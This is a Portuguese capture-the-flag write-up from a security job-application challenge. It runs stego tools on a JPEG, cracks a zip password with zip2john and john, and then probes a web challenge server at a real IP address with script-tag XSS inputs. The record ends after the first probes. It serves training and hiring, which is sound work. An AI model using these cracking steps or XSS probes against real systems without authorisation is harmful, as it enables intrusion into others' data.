# Critical security

**Category:** CTF para vaga de trabalho
**aprovacao:** Consegui vaga de emprego 

> Você foi convidado pela critical security para realizar um teste de proficiência e demonstra todos o seu potencial de hacker raiz

## Write-up

# Primeira parte
Fazer a leitura do qrcode escondido dentro da imagem 
![ctf](https://github.com/darkcode357/ctf_critical/blob/master/img.jpeg?raw=true)
comandos usados para fazer a análise da jpg 

|Tool          |Description       |How to use     |
|--------------|------------------|---------------|
| file         |verificar que tipo de arquivo é a imagem  | `file stego.jpg` |
| exiftool     |verificar se existe alguma metadado oculto na imagem | `exiftool stego.jpg` |
| binwalk      |verificar se há presença de arquivos anexados na imagem | `binwalk stego.jpg`
| strings      |Verifique se há caracteres legíveis dentro da imagem | `strings stego.jpg`
| foremost     |verificar se não existe nenhum arquivo corrompido dentro da imagem | `foremost stego.jpg`
| pngcheck     |Checar se a imagem não era um outro arquivo de extensão alterada | `pngcheck stego.png`
| identify     |verificar se a imagem não estava corrompida | `identify -verbose stego.jpg`


## Comando file
```bash
darkcode@darkcode0x00:~/ctf_critical$ file img.jpeg 
img.jpeg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 800x600, components 3

```

## Comando exiftool
>Mostra todas os metadados informações em uma imagem, incluindo tags duplicadas e desconhecidas, classificadas por grupo
```bash
darkcode@darkcode0x00:~/ctf_critical$ exiftool -a -u -g1 img.jpeg
---- ExifTool ----
ExifTool Version Number         : 11.65
---- System ----
File Name                       : img.jpeg
Directory                       : .
File Size                       : 103 kB
File Modification Date/Time     : 2019:11:15 14:09:22-03:00
File Access Date/Time           : 2019:11:15 15:22:42-03:00
File Inode Change Date/Time     : 2019:11:15 15:22:38-03:00
File Permissions                : rw-r--r--
---- File ----
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Image Width                     : 800
Image Height                    : 600
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
---- JFIF ----
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
---- Composite ----
Image Size                      : 800x600
Megapixels                      : 0.480

```

## Comando binwalk
```Bash
darkcode@darkcode0x00:~/ctf_critical$ binwalk --verbose -f dsa img.jpeg -D='.*' && ls *

Scan Time:     2019-11-15 15:34:05
Target File:   /home/darkcode/ctf_critical/img.jpeg
MD5 Checksum:  f8f94c384f957f3f6423a033536a5437
Signatures:    391

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01

dsa  img.jpeg

_img.jpeg.extracted:
0

```

## comando strings
```bash
darkcode@darkcode0x00:~/ctf_critical$ strings -a img.jpeg 
JFIF
78Wav
2UVqu
#6BRX
35STbrst
&(9c
DGIfw
$45S
6CUt
)DJR
)DJR
)DJR
)DJR
)DJR
)DJR
)DJR
)DJR
)DJR
-en(
M~iJ"R
%)J"R
%)J"R
%)J"R
%)J"R
%)J"R
%)J"R
%)J"R
%)J"Vq
)DJR
)DJR
)DJR
)DJR
)DJR
)DJR
%)J"R
%)J"R
z'sw
6)JR
)DJR
)DJR
)DJR
)DJR
)DJR
)DJR
)DJR
)DJR
)DJR
)J"R
%)J"R
%)J"R
%)J"R
%)J"R
%)J"R
AIZ\H
ZRJ|
W;i(
x;mX
^4CZs
D/Z1(
+e)2
	WDX2
u(>[i_
FD+(
UeDq
!I$n
7#uz
BKFBQ
r7 u
WBv;HZ
6cOT
yen,
)DJR
)DJR
)DJR
)DJR
)DJR
)DJR
)DJR
)DJR
)DJR
)DJR
ej}CU
n7G{9v
c!WT;
}	[iB
s+`T
:pKXr
xJ%_
w>Z/
$)h[n+a
Fl~E~w
e+3?
%N9Q
-*@R
u5Np
7*iWS|
1la-+%
UT9v
QI(JRJH
uekZ
KiW*
f@t)|
mJf1XYm	m
f^2<{
P$*d
	T9Hx
qa)H
O+um
) y*
b4!v0
_kD/
!^Jz
.])J"R
%)J"R
%)J"R
%)J"R
%)J"R
%)J"R
AO0W6
$qkn
!(HJ
lyCN
@	?RvP
!/mkx
WlW,
;$-G
YpxU
\r\1{
%%JV!x
.r8M
PJ	+
!Ho~
uO_6
	O'PR
)DJR
)DJR
)DJR
)DJR
)DJR
)DJR
)DJR
)DJR
)DJR
.])J"R
%)J"R
%)J"R
%)J"R
%)J"R
%)J"R
+@q 
hzPI
Z%}F
)XOh
o}-8P
i)yM
t`@Q
Kj*6
ZTl}
-!D(
SFn 
F]Td
`\sK
IH	R
8rLB*
@nJ$
LUJj&
]eqx
k*'F
or4Z8
\XeEhI
_W^T
BBGRH
dv*;
V]LC
W43-
Cj$t
aYPE
*+% 
eARn
I[jzB
]IXO
'~^]
V;g}>/6|
G+jIP$
\QJ@
RYLx
j1\Q
7-i7
4Gy*m]
lZV	
)J"R
%)J"R
%)J"R
%)J"R
%)J"R
%)J"R
%)J"R
%)J"R
%)J"Vcf$
%)J"R
%)J"R
%)J"R
%)J"R
%)J"R
%)J"
B,r.WP
ImEC
7&ZC
E)BR
8p]y
GuK	
Ot[]"
Nn/-
8MP6
	nwJA
DmR[
CR//%
]z__
ySKKuG
-*JT
\n`:
fKp0
;AOO
|/;&
De$(
|&w{
N+	s/
bFln
+ n]y
vN 8G2{>Pv
]y)q=
)?x9
>C>=)
.)[l
:~Wp
f~ >
MnSX
si`vs
%)J"R
%)J"R
%)J"R
%)J"R
%)J"R
%)J"R
%)_vaI
j,vz
flEu
U4V<
)ooMX.
BJ[[
(zjM
{-}_vS
i]jJ
|1h6
Ka2Z
f\^W;
y&q`
nO!2
Yu~T
%jP	H
c\@v
iSjI
Z	 jQ
7:h>
|#NY
JKn8
[S[s
W_J"
m+gd
>sD\X
m)DJR
)DJR
)DJR
)DJR
)DJR
)DJR
)DJR
ts![
)DJR
)J"R
%)J"R
%)J"R
%)J"R
%)J"R
%)J"R
%)J"
+gd~
;uS(V
{= y=
)DJR
)DJR
)DJR
)DJR
)DJR
)DJR
)DJR
)DJR
)DJR
C!fB
TcJY
)%I?Rv=
R&=c
,.\r
'1vCv\~)
om.-
/?"v
JT"Wko
JQku
2*J,W
C!fB
Yu!I*I
%'bv
U8VA
K2[q{
cwd^
E/Z/
/3}V
*6h7
 /v%
%e(BJ
<EcV
Dd?,8
1kV-
9uOH
p$\e
jqe)
~Pk"
CHKh
%#aX
T3+Zox
.vW"d
Qf6;
;z+r
D[k:
6l_?
g^>KM
~#ao
):Gir
z!_i
3^-Z
	TcQ
Ne#pF
~f;7
,H s
^M)JQ
5Kut
nLd!
hN{{{%
q(HJB
W3LZ
-wWI
q)+)B
If9K}
95?8
Md<<
< [t
$v~SM
hz"c
uUM6
EZxnq
_;nt
`w$r
m%#;Jy
~z\n
+JuS
7S{6,zMn
ZsJxu
C#d2
f^Yn
dT5`vs
zzvQ
;sb~*
OPGq
sox|u
N:to
{V5_
/j@K
(QG~
*B/F
t-?.j
)fKn/u
TE < 
=kWx/=
bB&Ku@$
rkF%eCj
s(n|
r{F%e
~NMO
y	q*>m
	?}b
"`gf
!aD'v
&YXJco
F.Md
ZPds)(XQ
E)-$SH
ARs<k
L1M!
S/W4SK
0"!jRXa	
<[`x
=+_hF
*4ko
|/%i
!/4P
&*:AI
*QNzV
om.-
. xgv
[im3
9vq;
O*TK
)M[-
nyQc$
wbBOPS
k\kK
CkWyR
I'rz
P	$p
.KkO
%J%m
4wW1
Sj>~
	OROA
N$nA;
n.n<.
	I)I
!a.(
oW3D!
M2{Ne}
'Eho
\Yl7
	*[n!>HXHR
[b)Q
B7)<
}M]qK
_k;_
]Bp1n
d7;4
]3MK
jCZO
W@5)
:H=;
#rR}
V\wR2
1!^$0
rXma
;!=?
m_+j
+;zR
_Xm,
Juk"
RjP^
E]$}
+fs[n]
AO>'y^
jlI&
~/92
(|-.$z
?St^|
jmah<
0"!jRXa	
5T9W
t-?.j
JWU(
IWE$
?i>!
G0mP
gt+v
N)J;
^wjmp
hq#t
;u#6
|r>I6
J\X%
?`=J
~Pjt
d:]m*
b ~o
?5=E
1);7
Ir<{
D&D'V
I=I=6
M-]L
aR`]
wn57&
q)*y
Q+NS
lOAm
/*Du
[qxnD
}OU<4
:+CxC
tgFr
\Iq .
[Hu2
[__z
KRU";
M}Km
+Ji^
`Z}a
{+!/
.>,hb
b;2B
[*B|
5o.,
S%&/
%/I_
i=!IY
\CU1L
YKhX*!)V
MelHa
iE@e
lunv
^z{M:
*Ow0
;@yz
he~v
=$T$
GVR4
};V5"
IJ[i
KVAk
GrDh
3Cov4
b9@R
<~pV=
Cf$8m%
_:JR
%)J"R
GIu2
KJDd8
jsw[H
]%)J
^>E"
J_ai
??YW
Sm)'v
HH+h$t
^?8(
^Q&t
ZYh!@
]U)DT
om.-
cNIqP^m
1K"U
)ZO[u
	7,F
n+8+
vV;UW
k]}7Y
</,y
%f;3
Y&{6
OvGl
MUn-L
Zn@ 
Qhn7
.4T(
"``sv\
n\)h
OU/e!j
n:OP\WS
A*Y?
5(i]&
;)OEqE
Rv+i
r+D<:]
WwuZMU
JzTg
r~+/4
7uIN
}m%KY	
66Gm
?O\{
4cIuRv;
WGQ_?
yj%K!.
+bYr
JmovHK-
c[Ya
?E=]
?M=B
JOB{
%j=\
RZR#!
x?8;
Q\[k
Q\[k
??DS'
;l.?
X0iX
:_Kh|,
Sk` 
GI5nF
xF&a
%HJG
]goc
>A}U
K3Z!
O&&dh
*%Ek
dv	N-
Lv3n9
Mkm]
qf+[A
}UES
0L^j
!A/FQ;
l?Wu
.wv2+
xhu']u
PIk`T
Cr\j
OS3o
CdcF
)_=%L
);(u
~nC~
x**'c
$y.&
//_+
WV]aC
UX63
jtMP
~iJR
*IJR
<Ske
6Ew5
==g.
5RcM
N5of
u.#e)*
tqjG
DmNu+akiC
6!] 
XP?|W
WsDJT
9J\F
(1VI
~PjJ
|6pA
<)^oy
lAnm
Cb7?
*OO*
om9uX
*OO*
;o[sG
EfCsf=%	Yw
s?gx
lbF<
[nL^
<6\*	8F
$8[.b
r}*K
Rr|B
v3n9
bGz	
HO7c
\6Xl
adoQ
o5e_
88KL5
"Om6
eW:fWU
I!%hP
OUnORj
XCjRw
)JVKJ
EU\	i
Y-)DJ
y+mr
GHB~
1I0Uo
v9.e
tR4`
Z|eImI
#9oZ
mnl[R
zuIKR
3rL=
N*5K
/?"v
Zb[mY-
RO@OJ
y__M
==g.
+_*F
<jVE
]|byy
pGE$
?"?"
!#rI
fSiP
*KG 
.cd1f0
6;lF
W4	*
elON
*	p2
^%".
-=yv
=veM
?`=J
j$-h
7F0?
&lN2
+$jU
|9gy
,'}U
);Gy
JT"R
%)J"R
%)J"R
%)J"R
%)J"R
%)J"R
%)J"R
%)J"R
%)J"R
%)J"R
%)J"R
%)J"R
uIEt
KUb\_
vkor
I	@R
}A7E
OMBl
28xR
iHOr
K#xQ
S[Y%
ikmIq
]^9=
z3Ks
Hq	s
?`=J
Sk	W
Z?'&
i~U16
+H>"
7!	'
%,9O;
A!!K 
	Y2	e
<~kq
wn=5$
E@{N
Op*A P=
lvE:9
7E*>
pe2"M
W*Tv
^>E"
)H wVH
ynKn
'Oib
3#i[
ksT1r}
7'MR
JGyP
qkpc
=V>2
Amm;
i	;tlu
!%KqkQ
)JA$
Lu/r
~NMO
RO@A
A>>N
:?ktX|t
_/Np
'tn{0
}G#}
bu>!SJ]
Kcne+
	-%#
y{@G(
F@we
jKMn9
2^A9
!AN)%$
S{k}4
|CaW-<
kM1K
Kf|{
9p;f
TU\Y^
u7'G
>?tzc
y"[Zs
v{[2
^oP3(
nAW3
},y-H
MS',
EsKB
>XQI
g7>A
$Z_+
UCgs+
_`3tR
5M|n
:,TWcTq
Op3/
dV~OV
nnP{
)A)+IP
qg;.
ZSV4wS
II*J
G"[(
=Q;DtkBs
3]`@q
[%)J
jWT"
( )hIQ
L)f:
[kLt
l%IIuM
9djm
:H+W*F
bCJyE.6
B/?|I`
F'nH
5H_J
n?3Wq
PQo;E
^\T%v
 Zc#9
F\W2
5^ss
n?o	
V!.th
n;L!jS
j+po
";)Th
c-@>
^Ama*
Y,y(
<%8Ni
n+ey
lGWp|
)j!)JI$
-Nj[
&W"L
i	*[
	JR	$
XG) r
+W!PJ
)iej)
SI@	
K&E%
-AJJ
nmdv
j]MG#
Z	qL:
@%;o
RQ"%
qmF\E
oSaL
O/fRw
mZWZ8
A\y+
/Fm+R
:s[p<K
sn9{
?)!)N
%5+a
S`	 xZ
,_$c
O2P~
.KiB
+k_/
c8U!
Fm*q
G+JB
^ki-
veu~
gb/IR
)+n3
!*Z{7
;TqO
s%E;
s_;Z
j?[W
jCKa
hZAJ
kM5+3
EMVB
@	 V
5WgV
Ob:w
e^O$w]K
]@@JR
D1:)$
M*RV
[If"
]sb[m
BT	$
2v>I
m+YR
)*Zm
.?)]zv
sQoW
^>E"
-/t	
'o5e
}R\IqED
:oE#E
J$-E 
N`y\
:zn=
%Hu\
-R7nGj
qiH>b
?`=J
g8NA
iMr5
?`=J
~NMT
Vw^W
M@6EP
JiHw
EU\Q[
%K	J
&hV'~
)ap`
3eLt
elO[( 
0QG)>`
O;/?
8:6T
*_/*B
t+n@
{"-$
5=Mp
H.RN
VmaG
dHl}
-!IP
P5ik2}@
)aj#
#	OGM
^jj; 	
p};p|+
G]oY=
+*I))J
1%7(
.do6
N<dJ
Guh}v
4?Pxw
eI."
O0*'
BADxxt6
Lx%kB
E.8^?f
.!ID
=QSK
a5u|MO
qo?5
Khqn8
/X^_
|!9FI
)n-Cg
Wp;n
M>W_1
M^4C5zz#
1n|:
O78KeIJ
sS;	
	%JQ
A`N`M
*UUU
{XOt
W?3A
Pp-6
RRVR
e*P@R
\uJm
A5;"
^>E"
GPA 
n-!J
j@A(
)PsI0#
:VVJ~
oZEw
#R&dJE
O/MD
N!Z;:
7rVa
]%ynl
-RwS7$>
n/Ume
*	'p
/UlZ
?`=J
n=575
n=5b
O#oH
{SV<
)%)y)RB
A;)*
}))+
(7nb
TV|]
E=e,
.+>.
cVxv
JZm=
=+[A
79{D
u{w#
@Jw 
!^Sj y=T
 .JR
SJ?T
)*)J
k~_s
x![:
l-{_
}fV=
.!(YP
EMU=3
r:r[pl
aLu-
{x)Qb
[[GPC-{xt
&1L3
GG{[#e:
( lGNe
cW+z
nO"w
~/:J
e|3e
bzCL
i-u,y\
u;,'
0;WM
TPcxt
6 %JV
5gSX
~	?;YF
|C!uD
'r}5
|FgB}
b:b6
UTU/
I=w+
w.~3
LVBV
zl9K-
x"Nw7'
Uw}	
?cW_
?cW_
HZJV
iKPH
5b?E
1ljK
+y- $)@t
Mv,>
AIP>pGB(
2<N+
]eC}
hqbK!
\5Yr
	n1$
*Cko
V5Bjba
w&&"
@Cm4
_^]+
qE)ul<
GP	F
oMXW
Edzm
/pmN
 LkrO
'R5"s
_Y#K}
Cw+|
!J_eM
TmVI
~PjHEh
1P$t
3h&)pn
GQ^n
9inA~
.DtX;T
H*@_
?Uqk
[ROS
*dK{
XW/2
7;o\
YVst
?xFs
pvlHH
q'm=G
Di1c
c52#
zG<si
^	8}
O0x0
'rw!;
OwbMb
l/@.94
3	LCm
$Du|
+Wk.P
\@HiX
2:O|
t-!I;B
,y,#`y
Bd)#
ZeJIO/8?W
l[Ns
RH %I
 Q"@
UC/f
Z{&SP
"sr#
>j!G
y)>B
qj<N
jno{
so5X
})PRO
D^E.
UYSv
ZH$r:
h.ix
W!(S
Y{FC
uue|
kr7$
[V7oj
P@	(
HJyA;
.)eF
J(*$3
Tj(_
W	<,gw\
.?)]M/
ued'vw
7Eh5
~]U*=z
*i<t
>b#8
jJ@ 
@H7Z?;
(H*m;
r\JR
b+ra<
?uyrH>
~^MHE
)JVH
%)J"
L j~
lw5.
=	BB
8lni-
:MkV
Yfe/:
TA;o
v,^u
JTyB
`y$]-
%E,u5
pDV;5u;4
6]6~
=M-s*\Yb
3#c]
rMj8
?W"H)?
Gywx
+\KU
B#lZ=
%akJ6
x dk
V1bBg
%5k&
Qa\[
Q*Kq
fk\lH
6	q	Z
|?3o
]a2Q
6+~Ic
)DJR
;Krlm
.?)]N
.%+B
.[iRHa;
AIP>pGB*#xW=
)J(JR
$+rH
)XNkx
R	Q=
++"R
Jmai;
}cI\WC
[a>[V
X}OE
^pPI!
KkP%X
/*Du
i(q'
U45.
B%?&
*JGR:
}>\N
<+Eb
n+?R
<lc3
scpw"
!^Dt
!	JS
Em|U0
>#KU
j.=3K
eX3q
\82<
cE~a
@zRz
z$wf
yqM[c
}(rJ
*'r~
}E]3
*47Iu
=F(<'q
X_Fc
$85kR
i~eeg"
HA@*JVRz-!<
nk($
^~B?
;E#h\
8\*_
}iJWUxT
)DJR
nMvL2
T>D-
Ksnu
@?YCA=
"W/l
m %*_(	
;^r>
<ebw;
\@_4
S2YT
wxS%
.7xQ\Ry
&+	b
1|^D
)2[m
7@J@;
b.Al
SjRwx
WUK"
.%ms
8|cp
U=:R
hlTJwp
)Pdh
sa` 
n^I~
ZXu}
7$%*$
)*P#
VqCm
_(;,6
JwF=
'Qb]
-pxc
 wC{
)DJR
)DJR
)DJR
)DJR
'`7'
%)J"
V%*]
M^uy
\-kLmX
GVeY\
\S9p
{iqo
	lBTT
>{>i
/?"v
/?"v
#U#U
Or|!
2_am
E@6E
95?8
yOAS+S
	\gVI%Je]
|6<<
-k*j\
y>rj
=ODo
ZpLC
3R?F4
Bzt*
=v;*
T76K
#"D9
/@C`
OXPPH
<jq/
D0!Gp
mmnC
V5.L
6m-!HKiA
7.jzKiB
mh?q
+jW [
u;nH
Mv,>
AIP>pGB+
v lz
Zls-
zI#aW
|1q%d
BiOBA}	X
\	IR7
7?E>
7?Ez
?`=J
JVGT^
k^#xJR
U5*N
\_ByO
uB-OJR
iE$Wo
)DJR
)DJR
)DJR
)DJR
)DJR
)DJR
$#e9
B%)J
zVVD
?;&f
s1Lt
+Kx"
ZApy
a|*h|
]uR>
* qw
S)KSq
:W7&v
;Rd+ ma
>{>i
~^MA
?`=J
`;9/1tLP
Hn|{sp!
Znpf.
2)"=
4I6C
gZ8R
vOE=
%)J"R
!	m<
_StU_^
^>E"
B--JR
*RI;
]H#b
#rv	
W(*Q
Mbh^
O7/>
M${T
.Z,j0
!Hr8Ap3
+[hI
lWfR
)%-r
t$[?
2vWi
}jdp
wVXY>
mLCH
b:Qj
7Om 
ixlQ
% Tz
DxS5-
bWUK
:jGx?
%*Og
 %j;
't%eTE7
ehA=v[kRJGO
qfknB
Ii(o
#9 K
Z[@@Q
LfDY
oR/M
25IU
Pa6!
^>E"
/15/|
;T;t6
a4I	H
r.v;
u{$$s-D
RQz"
]u{$$s-I$
c\Mc01
mE+B
#pEE
9{Rf|/
B5R5w
dJUNxf
)DJR
)DJR
)DJR
)DJR
)DJR
)DJR
)DJR
)DJR
)DJR
)DJR
	QmKJTS
j$%`
/K0+
]%)tT
l%Cf
=pqh
E[Z[
~.3<G"
)J"R
%)J"R
%)J"R
%)J"R
%)J"R
%)J"R
Sn$)*
jjWo
%)J"R
%)J"R
%)J"R
%)J"R
%)J"R
%)J"R
%)J"R
%)J"R
%)J"R
%)J"W*
)DJR
)DJR
)DJR
)DJR
)DJR
)DJR
%)J"R
%)J"R
%)J"R
%)J"R
%)J"R
%)J"R
%)J"R
%)J"R
)DJR
)DJR
)DJR
)DJR
)DJR
)DJR
)DJR
)DJR
)DJR

```

## Comando foremost
```Bash
darkcode@darkcode0x00:~/ctf_critical$ dd if=img.jpeg of=img.dd bs=64K conv=noerror,sync
1+1 records in
2+0 records out
131072 bytes (131 kB, 128 KiB) copied, 0,000330129 s, 397 MB/s
darkcode@darkcode0x00:~/ctf_critical$ sudo foremost -s 10 -t all -i image.dd -v 
Foremost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick Mikus
Audit File

Foremost started at Fri Nov 15 15:46:23 2019
Invocation: foremost -s 10 -t all -i image.dd -v 
Output directory: /home/darkcode/ctf_critical/output
Configuration file: /etc/foremost.conf
Processing: stdin
|------------------------------------------------------------------
File: stdin
Start: Fri Nov 15 15:46:23 2019
Length: Unknown
Skipping: 5 KB (5120 bytes)
 
Num	 Name (bs=512)	       Size	 File Offset	 Comment 

```

## comando pngcheck
```bash
pngcheck img.jpeg 
img.jpeg  this is neither a PNG or JNG image nor a MNG stream
ERROR: img.jpeg

```

## Comando identify
```Bash
mage: img.jpeg
  Format: JPEG (Joint Photographic Experts Group JFIF format)
  Mime type: image/jpeg
  Class: DirectClass
  Geometry: 800x600+0+0
  Units: Undefined
  Colorspace: sRGB
  Type: TrueColor
  Base type: Undefined
  Endianess: Undefined
  Depth: 8-bit
  Channel depth:
    red: 8-bit
    green: 8-bit
    blue: 8-bit
  Channel statistics:
    Pixels: 480000
    Red:
      min: 0  (0)
      max: 255 (1)
      mean: 201.287 (0.789359)
      standard deviation: 81.5649 (0.319862)
      kurtosis: 1.56933
      skewness: -1.76629
      entropy: 0.561248
    Green:
      min: 0  (0)
      max: 255 (1)
      mean: 187.829 (0.736585)
      standard deviation: 92.621 (0.36322)
      kurtosis: -0.256847
      skewness: -1.24185
      entropy: 0.583634
    Blue:
      min: 0  (0)
      max: 255 (1)
      mean: 187.668 (0.735955)
      standard deviation: 92.5927 (0.363109)
      kurtosis: -0.275626
      skewness: -1.23654
      entropy: 0.597382
  Image statistics:
    Overall:
      min: 0  (0)
      max: 255 (1)
      mean: 192.261 (0.753966)
      standard deviation: 88.9262 (0.34873)
      kurtosis: 0.199886
      skewness: -1.39379
      entropy: 0.580755
  Rendering intent: Perceptual
  Gamma: 0.454545
  Chromaticity:
    red primary: (0.64,0.33)
    green primary: (0.3,0.6)
    blue primary: (0.15,0.06)
    white point: (0.3127,0.329)
  Background color: white
  Border color: srgb(223,223,223)
  Matte color: grey74
  Transparent color: black
  Interlace: None
  Intensity: Undefined
  Compose: Over
  Page geometry: 800x600+0+0
  Dispose: Undefined
  Iterations: 0
  Compression: JPEG
  Quality: 92
  Orientation: Undefined
  Properties:
    date:create: 2019-11-15T15:22:38-03:00
    date:modify: 2019-11-15T14:09:22-03:00
    jpeg:colorspace: 2
    jpeg:sampling-factor: 2x2,1x1,1x1
    signature: bf3a3628e476f165913f898bbb308af37876ef22c34bab8aaedf2654df6199a6
  Artifacts:
    filename: img.jpeg
    verbose: true
  Tainted: False
  Filesize: 105718B
  Number pixels: 480000
  User time: 0.000u
  Elapsed time: 0:01.000
  Version: ImageMagick 6.9.10-23 Q16 x86_64 20190101 https://imagemagick.org
```
>De acordo com a saída da tool identify baseando em técnicas de estego, pensei em trabalhar com o nível de cores, uma vez que as ferramentas usadas não retornavam nada de anormal.
>Link da ferramenta https://29a.ch/photo-forensics/#pca 
![imagem](https://github.com/darkcode357/ctf_critical/raw/master/Screenshot%20from%202019-11-15%2016-01-17.png)

>Após pegar o link com o QRCode legível (aparelho da leitura foi meu telefone Samsung S7)
ele retorna uma URL encurtada (https://lnnk.in/@criticalsecdesafio)

>que redireciona para o [google drive](https://drive.google.com/open?id=1WsgIl-714HrFiawzKSC1MZaN8MS9u8Mn) onde você
>irá baixar um arquivo chamado 'segredo.zip'
>

# Segunda parte quebrar o zip
|Tool          |Description       |How to use     |
|--------------|------------------|---------------|
| john         |verificar que tipo de arquivo é a imagem | `john hash` |
| zip2john     | cria a hash do arquivo zip para o formato do john| `zip2john segredo.zip`| 
>apos baixar o zip e telo em seu computador você 

##Comando zip2jon
```Bash
darkcode@darkcode0x00:~/ctf_critical$ zip2john segredo.zip > hash
ver 2.0 efh 5455 efh 7875 segredo.zip/sonumeros.txt PKZIP Encr: 2b chk, TS_chk, cmplen=105, decmplen=115, crc=253A9259
darkcode@darkcode0x00:~/ctf_critical$ cat hash 
segredo.zip/sonumeros.txt:$pkzip2$1*2*2*0*69*73*253a9259*0*47*8*69*253a*7a38*4459e00b45c956acee7bd0f4ee4c8981ac9a09d9d69e52d2d29a144b2db0ea3928b7048fecfce562bafe70c8068ce64fbfc434e16e25d3a48a6ae1d82b3c31f2cbba408a48a745e0bd58997bec312cbc796e428de4d21e898a3c2db74941282af88b2bb2a8ab9f1eaa*$/pkzip2$:sonumeros.txt:segredo.zip::segredo.zip
darkcode@darkcode0x00:~/ctf_critical$ 
```
![crack](https://github.com/darkcode357/ctf_critical/blob/master/Screenshot%20from%202019-11-15%2016-17-18.png?raw=true)
> unzip file 
```Bash
darkcode@darkcode0x00:~/ctf_critical$ sudo unzip -P 73228 segredo.zip 
Archive:  segredo.zip
  inflating: sonumeros.txt           
darkcode@darkcode0x00:~/ctf_critical$ ls
 hash
 img.jpeg
 output
'Screenshot from 2019-11-15 16-01-17.png'
'Screenshot from 2019-11-15 16-17-18.png'
 segredo.zip
 sonumeros.txt
darkcode@darkcode0x00:~/ctf_critical$ cat sonumeros.txt 
Para essa parte do desafio, somente a porta 12321 deste servidor faz parte do
desafio.

http://142.93.73.149:12321
darkcode@darkcode0x00:~/ctf_critical$
```
# Parte 3 exploração final web
> Após todo o nosso trabalho anterior, obtemos um link para analisar http://142.93.73.149:12321

|Tool          |Description       |How to use     |
|--------------|------------------|---------------|
| curl         |fazer todas as requisições         | `curl url` |
| burpsuit     |analisar as requisições com proxy| `burpsuit`| 
| zap          |analisar as requisições com proxy|  `zip`    |

>observação nenhuma ferramenta de scanner web funcionar todos os comandos tem que ser feito manualmente, tentei usar
>nikto, vegas, dirb, dirbuster, wfuss e nada funcionou 

## primeiro passo ler html
```bash
darkcode@darkcode0x00:~/ctf_critical$ curl http://142.93.73.149:12321

<!DOCTYPE html>
<head>
</head>
<h2>Blue Team vs Red Team<link href="https://fonts.googleapis.com/css?family=IBM+Plex+Mono&display=swap" rel="stylesheet"/></h2>
<style>  body {
  font-family: 'Waiting for the Sunrise', cursive;
  font-size:30px;
  color: white;
  margin: 10px 50px;
  letter-spacing: 6px;
  font-weight: bold;
  height: calc(100vh - 8em);
  padding: 4em;

  background-color: rgb(25,25,25);
  }
</style>
<body>
</body>
<div id="typedtext">
</div>
<script type="text/javascript">

function strip(b){
  var div = document.createElement('div');
  div.setAttribute('id','t');
  document.body.appendChild(div);
  var div = document.getElementById('t');
  div.innerHTML = b.replace(/<\/?\w+[^>]*\/?>/g, );
  return (div.innerText || div.textContent);
}

function d(){
  var f = strip(decodeURIComponent(document.referrer));
}

d();</script><script>  // set up text to print, each item in array is new line
  var aText = new Array(
  "<b><font color='blue'>Blue Team</font></b><p> Blue Team são os profissionais especializados em defesa cibernética, focados em detecção de ameaças e resposta de incidentes, cujo objetivo é manter a segurança dos sistemas e aplicações de uma organização.</p>",
  "<b><font color='red'>Red Team</font></b><p> São os profissionais especializados em diversas áreas (redes, desenvolvimento, pentest e entre outras), eles devem avaliar a segurança de uma organização. </p>"

  );
  var iSpeed = 100; // time delay of print out
  var iIndex = 0; // start printing array at this posision
  var iArrLength = aText[0].length; // the length of the text array
  var iScrollAt = 20; // start scrolling up at this many lines

  var iTextPos = 0; // initialise text position
  var sContents = ''; // initialise contents variable
  var iRow; // initialise current row

  function typewriter()
  {
   sContents =  ' ';
   iRow = Math.max(0, iIndex-iScrollAt);
   var destination = document.getElementById("typedtext");

   while ( iRow < iIndex ) {
    sContents += aText[iRow++] + '<br />';
   }
   destination.innerHTML = sContents + aText[iIndex].substring(0, iTextPos) + "_";
   if ( iTextPos++ == iArrLength ) {
    iTextPos = 0;
    iIndex++;
    if ( iIndex != aText.length ) {
     iArrLength = aText[iIndex].length;
     setTimeout("typewriter()", 500);
    }
   } else {
    setTimeout("typewriter()", iSpeed);
   }
  }

  typewriter();
</script></html>
<!-- /?xml -->
```
> o que podemos reparar nesse html, temos algumas funções bem suspeitas, a função strip(b) e a função d()
>

> função strip(b) no primeiro passo eu pensei que ela iria ocultar o conteúdo da div<t>, pois essa função cria uma div 
>linda todas as tags através da função b.replace(/<\/?\w+[^>]*\/?>/g, ); fazendo eu pensar que ele substituiria a flag ou do tipo por nada ou tirando os elementos de um xss

>função d() utiliza o strip para fazer a limpeza. usando o decodeURIComponent para decodificar a url exemplo %20 passando como parâmetro 

>pensando como um programador, pensei que o document.referrer poderia ter algo, mas ele estava vazio, pensei que a flag estaria aí

>dentro do console_web eu vi que eu consegui trabalhar do lado do cliente, assim consigo reescrever a função strip e
>consigo escrever na tela, segue a imagem abaixo

>analisando a o código reparei que existia um parâmetro comentado chamado /?xml, no qual eu pensei em analisá-lo passo a passo

## Segundo passo analise Burp
![img](https://github.com/darkcode357/ctf_critical/blob/master/Screenshot%20from%202019-11-15%2016-54-33.png?raw=true)
![img](https://github.com/darkcode357/ctf_critical/blob/master/Screenshot%20from%202019-11-15%2016-54-47.png?raw=true)
![img](https://github.com/darkcode357/ctf_critical/blob/master/Screenshot%20from%202019-11-15%2016-54-56.png?raw=true)

## terceiro passo teste de requisição
```bash
root@darkcode0x00:~# curl http://142.93.73.149:12321/?xml="<script>teste</script>"
<script>teste</script> 

root@darkcode0x00:~# curl http://142.93.73.149:12321/?xml="<script></script>"
<script/>

root@darkcode0x00:~# curl http://142.93.73.149:12321/?xml="1 1"
<head>
<title>Error response</title>
</head>
<body>
<h1>Error response</h1>
<p>Error code 400.
<p>Message: Bad request syntax ('GET /?xml=1 1 HTTP/1.1').
<p>Error code explanation: 400 = Bad request syntax or unsupported method.
</body>

root@darkcode0x00:~# curl http://142.93.73.149:12321/?xml="Waiting for the Sunrise"
<head>
<title>Error response</title>
</head>
<body>
<h1>Error response</h1>
<p>Error code 400.
<p>Message: Bad request syntax ('GET /?xml=Waiting for the Sunrise HTTP/1.1').
<p>Error code explanation: 400 = Bad request syntax or unsupported method.
</body>

